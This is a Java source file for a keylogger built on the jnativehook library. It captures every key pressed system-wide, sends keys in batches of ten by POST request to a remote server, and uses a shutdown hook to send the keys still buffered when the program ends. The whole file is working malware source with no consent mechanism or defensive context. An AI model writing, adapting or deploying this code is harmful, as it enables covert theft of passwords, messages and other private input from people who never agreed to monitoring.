package com.company;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import java.io.IOException;

/*
 * This collects all keys typed on the computer using the jnativehook library.
 * The implementation buffers every 10 keys and sends those to a server using a POST request.
 * On termination the program will send the last keys left in the buffer.
*/

public class Main implements NativeKeyListener {

    private int countedPresses = 0;
    private static String keysPressed = "";

    //Send last keys not sent before termination
    static class ExitKeys extends Thread {
        public void run() {
            try {
                JavaPostRequest.setParameters(keysPressed);
                JavaPostRequest.Connect();

                JavaPostRequest.setParameters("----End----"); //Marker that session is over
                JavaPostRequest.Connect();

                System.out.println("SUCCESS");
            } catch (IOException e) {
                e.printStackTrace();
                System.out.println("FAIL");
            }
        }
    }

    public static void main(String[] args) {

        //TEST CONNECTION
        try {
            JavaPostRequest.setParameters("----Begin----");
            JavaPostRequest.Connect();
            System.out.println("Connected Success");
        } catch (IOException e) {
            e.printStackTrace();
            System.out.println("Failed to connect");
        }

        Runtime.getRuntime().addShutdownHook(new ExitKeys());

        //START LOGGING KEYS
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(new Main());
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
        //System.out.println(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        //System.out.println(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));

        String temp = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
        if(temp.length() > 1){
            keysPressed = keysPressed + " " +temp+" ";
        } else {
            keysPressed += temp;
        }

        countedPresses++;
        if(countedPresses == 10){ //Only passing 10 keys at a time to avoid too many POST requests
            countedPresses = 0;   //Also choosing to split data to avoid one giant entry into server on termination
            try {
                JavaPostRequest.setParameters(keysPressed); //The keys being sent
                JavaPostRequest.Connect(); //Connect and send
                System.out.println("SUCCESS");
            } catch (IOException e) {
                e.printStackTrace();
                System.out.println("FAIL");
            }
            keysPressed = "";
        }
    }

    //Lets us know when shift is let go of
    //Ignoring caps lock due to jnativehook not recognizing it
    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
        //System.out.println(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
        String temp = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
        if(temp.equalsIgnoreCase("Shift")){
            keysPressed += "(rel-shift)";
        }
    }
}
